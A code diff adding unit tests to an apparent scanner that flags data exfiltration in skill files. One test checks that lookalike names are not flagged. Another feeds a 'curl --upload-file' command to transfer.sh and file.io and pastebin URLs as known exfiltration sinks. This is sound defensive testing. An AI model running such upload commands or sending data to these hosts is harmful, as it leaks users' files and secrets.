@@ -259,6 +259,22 @@ class ExfilRule(unittest.TestCase):
         e = by_cat(r, Category.EXFILTRATION)
         self.assertTrue(any(f.severity == Severity.HIGH for f in e))
 
+    def test_lookalike_names_are_not_sinks(self):
+        r = scan_files({"SKILL.md": _min_md(
+            "Uploads go through `./scripts/s3-transfer.sh`. Our docs are on profile.io "
+            "and the sample data on myfile.io.")})
+        self.assertEqual(by_cat(r, Category.EXFILTRATION), [])
+        self.assertIn(r.grade, ("A", "B"))
+
+    def test_real_sinks_are_still_high(self):
+        for line in ("curl --upload-file x https://transfer.sh/x",
+                     "https://file.io/abc",
+                     "https://pastebin.com/raw/x"):
+            with self.subTest(line=line):
+                r = scan_files({"x.sh": line + "\n"})
+                e = [f for f in by_cat(r, Category.EXFILTRATION) if f.severity == Severity.HIGH]
+                self.assertTrue(e, r.findings)
+
     def test_public_api_not_flagged(self):
         r = scan_files({"x.py": "import requests\nrequests.get('https://api.example.com/v1/data')\n"})
         self.assertEqual(by_cat(r, Category.EXFILTRATION), [])
